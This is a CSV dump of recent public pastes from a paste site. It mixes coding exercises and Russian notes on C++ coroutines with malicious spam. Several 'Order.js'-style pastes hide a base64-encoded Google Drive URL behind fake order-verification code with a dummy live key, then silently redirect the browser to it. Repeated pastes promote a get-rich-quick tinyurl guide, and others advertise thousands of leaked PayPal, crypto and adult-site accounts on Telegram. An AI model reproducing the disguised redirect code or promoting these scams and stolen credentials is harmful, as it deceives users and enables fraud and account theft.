id,title,username,language,date,content
t8506d75,EARN $900 INSTANTLY 2025⭐ WF,Aximos1315,JavaScript,Wednesday 23rd of April 2025 07:06:45 AM CDT," 
Pdf https://tinyurl.com/privguidee


bpg2XQg1HP
"
9cT9qFQZ,Order.js,jm33,JavaScript,Wednesday 23rd of April 2025 06:58:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47898/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
716BXR7y,Crypto Accounts,SpawnKz,JavaScript,Wednesday 23rd of April 2025 06:57:31 AM CDT,37316 Accounts Posted On https://t.me/leakedbyeminem
ymRuTvtS,Make $1000 15-MINUTES  (BEGINNER) KB,Aximos1315,JavaScript,Wednesday 23rd of April 2025 06:57:27 AM CDT," 
Pdf https://tinyurl.com/privguidee


Hod9gmkM1g
"
PufgFEbg,EARN $900 INSTANTLY 2025 TA,Aximos1315,JavaScript,Wednesday 23rd of April 2025 06:48:11 AM CDT," 
Pdf https://tinyurl.com/privguidee


Yh9QaiIkSw
"
b8nmnH61,PayPal with Balance,SpawnKz,JavaScript,Wednesday 23rd of April 2025 06:42:07 AM CDT,79632 Accounts Posted On https://t.me/leakedbyeminem
Z1pdfgDi,Make $1000 15-MINUTES (BEGINNER) 14,Aximos1315,JavaScript,Wednesday 23rd of April 2025 06:38:57 AM CDT," 
Pdf https://tinyurl.com/privguidee


9i6UCw2GZc
"
eaT6mVXt,EARN $900 INSTANTLY 2025⭐ WF,Aximos1315,JavaScript,Wednesday 23rd of April 2025 06:29:40 AM CDT," 
Pdf https://tinyurl.com/privguidee


L2eqZE1LRd
"
GN17SGCC,Untitled,jm33,JavaScript,Wednesday 23rd of April 2025 06:27:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72973/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sPP0Jfeg,Leaked Accounts - Fresh Hits,SpawnKz,JavaScript,Wednesday 23rd of April 2025 06:26:43 AM CDT,79158 Accounts Posted On https://t.me/leakedbyeminem
62mBk0JT,[NP] File System Mapped,dzocesrce,Java,Wednesday 23rd of April 2025 06:21:22 AM CDT,"import java.time.LocalDateTime;
import java.util.*;
import java.util.stream.Collectors;
import java.time.LocalDateTime;
import java.util.Comparator;
import java.time.LocalDateTime;
import java.util.*;
import java.util.stream.Collectors;
public class FileSystemTest {
    public static void main(String[] args) {
        FileSystem fileSystem = new FileSystem();
        Scanner scanner = new Scanner(System.in);
        int n = scanner.nextInt();
        scanner.nextLine();
        for (int i = 0; i < n; i++) {
            String line = scanner.nextLine();
            String[] parts = line.split("":"");
            fileSystem.addFile(parts[0].charAt(0), parts[1],
                    Integer.parseInt(parts[2]),
                    LocalDateTime.of(2016, 12, 29, 0, 0, 0).minusDays(Integer.parseInt(parts[3]))
            );
        }
        int action = scanner.nextInt();
        if (action == 0) {
            scanner.nextLine();
            int size = scanner.nextInt();
            System.out.println(""== Find all hidden files with size less then "" + size);
            List<File> files = fileSystem.findAllHiddenFilesWithSizeLessThen(size);
            files.forEach(System.out::println);
        } else if (action == 1) {
            scanner.nextLine();
            String[] parts = scanner.nextLine().split("":"");
            System.out.println(""== Total size of files from folders: "" + Arrays.toString(parts));
            int totalSize = fileSystem.totalSizeOfFilesFromFolders(Arrays.stream(parts)
                    .map(s -> s.charAt(0))
                    .collect(Collectors.toList()));
            System.out.println(totalSize);
        } else if (action == 2) {
            System.out.println(""== Files by year"");
            Map<Integer, Set<File>> byYear = fileSystem.byYear();
            byYear.keySet().stream().sorted()
                    .forEach(key -> {
                        System.out.printf(""Year: %d\n"", key);
                        Set<File> files = byYear.get(key);
                        files.stream()
                                .sorted()
                                .forEach(System.out::println);
                    });
        } else if (action == 3) {
            System.out.println(""== Size by month and day"");
            Map<String, Long> byMonthAndDay = fileSystem.sizeByMonthAndDay();
            byMonthAndDay.keySet().stream().sorted()
                    .forEach(key -> System.out.printf(""%s -> %d\n"", key, byMonthAndDay.get(key)));
        }
        scanner.close();
    }
}

class FileSystem {
    List<File> files;

    public FileSystem() {
        this.files = new ArrayList<>();
    }

    public void addFile(char folder, String name, int size, LocalDateTime localDateTime) {
        files.add(new File(folder,name,size,localDateTime));
    }

    public List<File> findAllHiddenFilesWithSizeLessThen(int size) {
        return files.stream()
                .filter(i->i.getName().charAt(0)=='.'&& i.getSize()<size)
                .sorted()
                .collect(Collectors.toList());

    }

    public int totalSizeOfFilesFromFolders(List<Character> collect) {
        int sumOfAllFiles=0;
        for(Character c : collect) {
            sumOfAllFiles+=files.stream().filter(i->i.getFolder()==c).mapToInt(File::getSize).sum();
        }
        return sumOfAllFiles;
    }

    public Map<Integer, Set<File>> byYear() {
        return files.stream().sorted().collect(Collectors.groupingBy(
                File::getYear,
                Collectors.toSet()
        ));
    }

    public Map<String, Long> sizeByMonthAndDay() {
        return files.stream().sorted().collect(Collectors.groupingBy(
                File::getMonthAndDay,
                Collectors.summingLong(File::getSize)
        ));
    }
}


class File implements Comparable<File>{
    char folder;
    String name;
    int size;
    LocalDateTime createdAt;

    public char getFolder() {
        return folder;
    }

    public String getName() {
        return name;
    }

    public int getSize() {
        return size;
    }

    public LocalDateTime getCreatedAt() {
        return createdAt;
    }

    public int getYear(){
        return createdAt.getYear();
    }

    public String getMonthAndDay(){
        return createdAt.getMonth().toString()+""-""+createdAt.getDayOfMonth();
    }

    public File(char folder, String name, int size, LocalDateTime createdAt) {
        this.folder = folder;
        this.name = name;
        this.size = size;
        this.createdAt = createdAt;
    }

    @Override
    public String toString() {
        return String.format(""%-10s %5dB %s"",getName(),getSize(),getCreatedAt());
    }

    @Override
    public int compareTo(File o) {
        return Comparator.comparing(File::getFolder)
                .thenComparing(File::getCreatedAt)
                .thenComparing(File::getName)
                .thenComparing(File::getSize)
                .compare(this,o);
    }
}
"
T04g44hN,EARN $900 INSTANTLY 2025 TA,PuyiieAcademy21,JavaScript,Wednesday 23rd of April 2025 06:20:23 AM CDT," 
Pdf https://tinyurl.com/privguidee


pFiHJTq19D
"
PvjXzTC5,Minify-test,ThepasswordMan01,JavaScript,Wednesday 23rd of April 2025 06:15:42 AM CDT,"// ==================================================
// IMPORTATIONS DES MODULES
// ==================================================
const http          = require('http');
const fs            = require('fs');
const path          = require('path');
const url           = require('url');
const querystring   = require('querystring');

// ==================================================
// CONFIGURATION DU SERVEUR
// ==================================================
const serverPort    = 3000;
const serverHost    = 'localhost';
const publicDir     = path.join(__dirname, 'public');
const uploadDir     = path.join(__dirname, 'uploads');

// Formats de fichiers autorisés
const allowedMimeTypes = {
    'image/jpeg': 'jpg',
    'image/png': 'png',
    'text/plain': 'txt'
};

// Routes de l'application
const appRoutes = {
    '/': 'home',
    '/about': 'about',
    '/contact': 'contact',
    '/api': 'api'
};

// ==================================================
// FONCTIONS UTILITAIRES (5 fonctions comme demandé)
// ==================================================

// 1. Fonction pour lire un fichier
function readFileAsync(filePath) {
    return new Promise((resolve, reject) => {
        fs.readFile(filePath, (err, data) => {
            if (err) reject(err);
            else resolve(data);
        });
    });
}

// 2. Fonction pour vérifier l'existence d'un dossier
function ensureDirectoryExists(dirPath) {
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
    }
}

// 3. Fonction de log personnalisé
function logRequest(req, statusCode) {
    const timestamp   = new Date().toISOString();
    const method      = req.method;
    const endpoint    = req.url;
    
    console.log(`[${timestamp}] ${method} ${endpoint} - ${statusCode}`);
}

// 4. Fonction de validation d'email
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// 5. Fonction de parsing du corps de requête
async function parseRequestBody(req) {
    return new Promise((resolve) => {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', () => {
            if (req.headers['content-type'] === 'application/json') {
                resolve(JSON.parse(body));
            } else {
                resolve(querystring.parse(body));
            }
        });
    });
}

// ==================================================
// MIDDLEWARES
// ==================================================

// Middleware de logging
function requestLogger(req, res, next) {
    const startTime = Date.now();
    
    res.on('finish', () => {
        const duration = Date.now() - startTime;
        logRequest(req, res.statusCode);
        console.log(`Temps de traitement: ${duration}ms`);
    });
    
    next();
}

// Middleware de sécurité basique
function securityHeaders(req, res, next) {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    
    next();
}

// ==================================================
// GESTION DES ROUTES
// ==================================================

async function handleStaticFiles(req, res) {
    const parsedUrl  = url.parse(req.url);
    let pathname     = path.join(publicDir, parsedUrl.pathname);
    
    try {
        const fileStats = await fs.promises.stat(pathname);
        
        if (fileStats.isDirectory()) {
            pathname = path.join(pathname, 'index.html');
        }
        
        const fileData = await readFileAsync(pathname);
        const ext      = path.extname(pathname).substring(1);
        
        res.setHeader('Content-Type', getContentType(ext));
        res.end(fileData);
        
    } catch (err) {
        handleNotFound(res);
    }
}

function handleApiRoute(req, res) {
    const responseData = {
        status: 'success',
        message: 'Bienvenue sur l\'API',
        timestamp: new Date().toISOString(),
        endpoints: Object.keys(appRoutes)
    };
    
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify(responseData));
}

function handleNotFound(res) {
    res.statusCode = 404;
    res.end('Page non trouvée');
}

// ==================================================
// FONCTIONS SUPPORT
// ==================================================

function getContentType(ext) {
    const mimeTypes = {
        'html': 'text/html',
        'js': 'text/javascript',
        'css': 'text/css',
        'json': 'application/json',
        'png': 'image/png',
        'jpg': 'image/jpeg'
    };
    
    return mimeTypes[ext] || 'text/plain';
}

// ==================================================
// CREATION DU SERVEUR
// ==================================================

const server = http.createServer(async (req, res) => {
    // Appliquer les middlewares
    requestLogger(req, res, () => {});
    securityHeaders(req, res, () => {});
    
    const parsedUrl = url.parse(req.url, true);
    const routeKey  = Object.keys(appRoutes).find(key => parsedUrl.pathname.startsWith(key));
    
    // Router les requêtes
    if (parsedUrl.pathname.startsWith('/api')) {
        handleApiRoute(req, res);
    } else if (fs.existsSync(path.join(publicDir, parsedUrl.pathname))) {
        await handleStaticFiles(req, res);
    } else {
        handleNotFound(res);
    }
});

// ==================================================
// DEMARRAGE DU SERVEUR
// ==================================================

// S'assurer que les répertoires existent
ensureDirectoryExists(publicDir);
ensureDirectoryExists(uploadDir);

server.listen(serverPort, serverHost, () => {
    console.log(`Serveur démarré sur http://${serverHost}:${serverPort}`);
    console.log(`Répertoire public: ${publicDir}`);
    console.log(`Répertoire upload: ${uploadDir}`);
});"
dvcJ9Yg4,Products.js,jm33,JavaScript,Wednesday 23rd of April 2025 06:12:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42065/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9EnRQSrb,Chaturbate with Tokens,SpawnKz,JavaScript,Wednesday 23rd of April 2025 06:11:20 AM CDT,17295 Accounts Posted On https://t.me/leakedbyeminem
nc1Tmpkt,Make $1000 15-MINUTES (BEGINNER) 14,PuyiieAcademy21,JavaScript,Wednesday 23rd of April 2025 06:11:08 AM CDT," 
Pdf https://tinyurl.com/privguidee


WU2aSBpgX8
"
i7TJZvtK,dataNone,TestGuy1,JSON,Wednesday 23rd of April 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '1d60ef259f15b9ad1f62c6ab9beedcd11ff93050b45578792e54c954160edf3cb90f57b03c7c93c457aaf7b1dd3de3c61b21871d0542fffec2a598d13f433d913bc0214eb43e914d38307e005533188ee45b4d9d3146d47b6392c7aec6fde202588706435c8129a7e3e1382d1828492ce181d28fb473d85d718f818f525a651f',
  otherdata: [
    '5919d52ddf33ffe690f048312db93d68',
    '2eb17083e890c80e61a7a83c72861013',
    'c3fc590263f50b994d56a738b720b124',
    '4efefcd2a9c9f7d5688dd42ad578388f',
    'd055c92ad23d908f3d1e3a7c458e75f6',
    '6febb673edbe05c734f2a5041c8f42df',
    '9d37738235212e865ceec76d63b32510',
    'f1b12fab9cb54444d5961085a394b12e'
  ]
}"
nrr0F8JK,Order.js,jm33,JavaScript,Wednesday 23rd of April 2025 05:56:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13038/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
41rM4J6c,Crypto Accounts,SpawnKz,JavaScript,Wednesday 23rd of April 2025 05:55:50 AM CDT,52686 Accounts Posted On https://t.me/leakedbyeminem
DfT48hbV,Maximum Score of Words,Fastrail08,C++,Wednesday 23rd of April 2025 05:41:49 AM CDT,"#include <bits/stdc++.h>
using namespace std;

void getMaxScore(vector<string> &words, vector<int> &frequencies, vector<int> &scores, int index, int currScore, int &maxScore){
    if(index == words.size()){
        maxScore = max(maxScore, currScore);
        return;
    }
    
    //current word excluded
    getMaxScore(words, frequencies, scores, index + 1, currScore, maxScore);
    
    //deduct frequencies and add score if word included in set 
    bool charLeftToUse = true;
    for(int i = 0; i < words[index].size(); i++){
        char charInWord = words[index][i];
        frequencies[charInWord - 'a']--;
        if(frequencies[charInWord - 'a'] < 0){
            charLeftToUse = false;
        }
        currScore += scores[charInWord - 'a'];
    }
    
     //current word included, but if there is enough frequencies of the character present in word
    if(charLeftToUse){
        getMaxScore(words, frequencies, scores, index + 1, currScore, maxScore);
    }
    
    //revert the state of frequencies and currScore before returning
    for(int i = 0; i < words[index].size(); i++){
        char charInWord = words[index][i];
        frequencies[charInWord - 'a']++;
        currScore -= scores[charInWord - 'a'];
    }
    
}

int main() {
	// your code goes here
	
    int w, f, maxScore = 0;
    cin >> w;
    vector<string> words(w);
    vector<int> frequencies(26, 0);
    vector<int> scores(26, 0);
    for(int i = 0; i < w; i++){
        cin >> words[i];
    }
    
    
    cin >> f;
    char c;
    for(int i = 0; i < f; i++){
        cin >> c;
        frequencies[c - 'a']++;
    }
    
    // for(int i = 0; i < frequencies.size(); i++){
    //     cout << char (i + 'a') << "": "" << frequencies[i] << '\n';
    // }
    
    for(int i = 0; i < scores.size(); i++){
        cin >> scores[i];
    }
    
    // for(int i = 0; i < scores.size(); i++){
    //     cout << char (i + 'a') << "": "" << scores[i] << '\n';
    // }
    getMaxScore(words, frequencies, scores, 0, 0, maxScore);
    cout << maxScore << '\n';
}
"
fXWDn1sw,Market.js,jm33,JavaScript,Wednesday 23rd of April 2025 05:41:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71496/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H55BWeG7,PayPal with Balance,SpawnKz,JavaScript,Wednesday 23rd of April 2025 05:40:27 AM CDT,88687 Accounts Posted On https://t.me/leakedbyeminem
1tWxV2n7,Untitled,jm33,JavaScript,Wednesday 23rd of April 2025 05:25:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03626/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tzfxKFwH,Leaked Accounts - Fresh Hits,SpawnKz,JavaScript,Wednesday 23rd of April 2025 05:25:04 AM CDT,27523 Accounts Posted On https://t.me/leakedbyeminem
3MFuyZfw,CO_YEILD,AlexNovoross87,C++,Wednesday 23rd of April 2025 05:13:47 AM CDT,"co_yield в C++20
co_yield — это ключевое слово, введённое в C++20 для использования внутри корутин. Оно позволяет приостанавливать выполнение корутины и возвращать значение вызывающему коду, аналогично конструкции yield в других языках (например, Python).

Как работает co_yield
При выполнении выражения co_yield <expr>; корутина:

Приостанавливает выполнение.

Передаёт значение <expr> вызывающему коду.

Сохраняет своё состояние, чтобы позже можно было продолжить выполнение с этого места.

После возобновления корутина продолжает выполнение с точки после co_yield.

Применение
Основное применение — генераторы: ленивые последовательности, итераторы, потоки данных.

Например, можно реализовать функцию, которая возвращает последовательность чисел:

cpp
// Пример с генератором (C++23, std::generator)
#include <generator>
std::generator<int> range(int begin, int end) {
    for (int i = begin; i < end; ++i)
        co_yield i;
}
В C++20 стандартная библиотека не содержит готового генератора, поэтому тип возвращаемого значения должен быть специально реализован и поддерживать интерфейс корутин.

Технические детали
При каждом вызове co_yield компилятор вызывает метод promise_type::yield_value, который определяет, как именно значение передаётся наружу.

Для использования co_yield функция должна возвращать специальный тип (например, пользовательский генератор), а не обычный тип вроде int.

Краткое сравнение
Ключевое слово	Назначение
co_yield	Приостановить и вернуть значение
co_return	Завершить корутину и вернуть результат
co_await	Приостановить до завершения асинхронной операции
co_yield — фундаментальный инструмент для создания ленивых генераторов и потоков данных в C++20-корутинах."
DZttcPrP,Products.js,jm33,JavaScript,Wednesday 23rd of April 2025 05:10:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19129/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TZtt3sss,Chaturbate with Tokens,SpawnKz,JavaScript,Wednesday 23rd of April 2025 05:09:41 AM CDT,11518 Accounts Posted On https://t.me/leakedbyeminem
TZZFjL2T,CO_RETURN,AlexNovoross87,C++,Wednesday 23rd of April 2025 05:05:45 AM CDT,"Что такое co_return в C++
co_return — это ключевое слово в C++20, используемое в корутинах для завершения их выполнения и возврата результата. Оно аналогично return в обычных функциях, но с важными отличиями, связанными с асинхронной природой корутин.

Основные функции co_return
Завершение корутины:
co_return указывает, что корутина должна завершить свое выполнение.

Возврат значения (опционально):
Как и return, co_return может возвращать значение. Тип возвращаемого значения должен соответствовать типу, указанному в boost::asio::awaitable<T> (или boost::asio::awaitable<void>, если значение не возвращается).

Управление жизненным циклом:
co_return вызывает методы awaiter, необходимые для правильного завершения корутины и освобождения ресурсов.

Как использовать co_return
Внутри корутин:
co_return можно использовать только в функциях, объявленных как корутины (т.е. использующих co_await).

Соответствие типу:
Если корутина объявлена как boost::asio::awaitable<int>, co_return должен возвращать значение типа int. Если корутина объявлена как boost::asio::awaitable<void>, co_return используется без возвращаемого значения (co_return;).

Примеры использования
Корутина без возвращаемого значения:

text
boost::asio::awaitable<void> my_coroutine() {
    // ... асинхронные операции ...
    co_return;
}
Корутина с возвращаемым значением:

text
boost::asio::awaitable<int> calculate_value() {
    int result = 42;
    co_return result;
}
Важные моменты
Если корутина не содержит co_return, компилятор может добавить его автоматически в конце функции (если тип возвращаемого значения void). Однако, для ясности и правильной обработки ресурсов рекомендуется всегда добавлять co_return явно.

Если корутина возвращает boost::asio::awaitable<T>, но вы не указали значение для возврата (например, просто co_return;), компилятор выдаст ошибку, так как ожидает значение типа T.

Внутри корутин можно использовать co_return в нескольких местах (например, внутри условных операторов), чтобы завершить выполнение корутины в зависимости от определенных условий.

Пример с обработкой ошибок
text
boost::asio::awaitable<void> my_coroutine() {
    try {
        // ... асинхронные операции, которые могут вызвать исключения ...
        co_await async_operation();
        co_return;
    } catch (const std::exception& e) {
        std::cerr << ""Ошибка: "" << e.what() << std::endl;
        // Обработка ошибки
        co_return; // Важно завершить корутину даже при ошибке
    }
}
В этом примере co_return используется как для нормального завершения корутины, так и для завершения в случае возникновения исключения.

Заключение
co_return — это ключевое слово, необходимое для правильного завершения корутин в C++. Оно позволяет вернуть значение (если требуется) и корректно освободить ресурсы, обеспечивая предсказуемое поведение асинхронного кода."
fx9ZGWkx,Order.js,jm33,JavaScript,Wednesday 23rd of April 2025 04:55:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81493/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PJSzV2J1,Crypto Accounts,SpawnKz,JavaScript,Wednesday 23rd of April 2025 04:54:18 AM CDT,83781 Accounts Posted On https://t.me/leakedbyeminem
XG3BpvEp,CO_AWAIT,AlexNovoross87,C++,Wednesday 23rd of April 2025 04:53:39 AM CDT,"Что такое co_await в C++
co_await — это ключевое слово C++20 для работы с корутинами. Оно используется для приостановки выполнения корутины до завершения асинхронной операции и последующего автоматического возобновления корутины, когда результат готов.

Как работает co_await
Только для корутин:
Любая функция, содержащая co_await, автоматически становится корутиной. Все её локальные переменные и параметры сохраняются на куче, чтобы функция могла быть приостановлена и возобновлена без потери состояния.

Механика:
Когда компилятор встречает co_await expr;, он пытается получить специальный объект — awaiter — для выражения expr. Этот объект должен реализовывать три метода:

await_ready() — возвращает true, если операция завершена и не нужно приостанавливать корутину.

await_suspend(handle) — вызывается, если нужно приостановить корутину; получает дескриптор корутины, который можно использовать для её последующего возобновления.

await_resume() — вызывается при возобновлении корутины и возвращает результат операции.

Асинхронность:
Если await_ready() возвращает false, корутина приостанавливается, управление возвращается вызывающему коду, а возобновление произойдет, когда асинхронная операция завершится. Если возвращает true, выполнение продолжается сразу.

Пример:

cpp
co_await some_async_operation();
// Эта строка выполнится только после завершения some_async_operation
Отличие от обычного вызова функции
Обычный вызов foo(); просто выполняет функцию синхронно и блокирует поток до завершения.

co_await foo(); приостанавливает только корутину, не блокируя поток, и позволяет выполнять другие задачи до получения результата. После завершения асинхронной операции корутина автоматически возобновляется.

Применение
Асинхронный ввод-вывод:
Позволяет писать асинхронный код в линейном стиле, без вложенных колбэков и сложной логики управления состояниями.

Параллелизм:
Несколько корутин могут ожидать разные события, не блокируя друг друга.

Внутренние детали
Тип, который можно использовать с co_await, называется awaitable.

Awaitable может возвращать свой собственный awaiter через operator co_await, либо быть awaiter-ом сам по себе.

Awaiter управляет всей логикой приостановки и возобновления корутины.

Пример простого awaitable
cpp
struct simple_awaiter {
    bool await_ready() const noexcept { return false; }
    void await_suspend(std::coroutine_handle<>) const noexcept { /* ... */ }
    void await_resume() const noexcept { /* ... */ }
};

simple_awaiter some_async_operation();

co_await some_async_operation();
Итог
co_await — это инструмент для приостановки и возобновления корутин в C++. Он позволяет реализовать асинхронное поведение без блокировки потоков, делая асинхронный код простым и читаемым."
Fj3GU9F6,OrderHelper,xxx09,C#,Wednesday 23rd of April 2025 04:49:33 AM CDT,"DatabaseHelper.cs:
namespace OrderTracker
{
    using System.Data.SQLite;

    public static class DatabaseHelper
    {
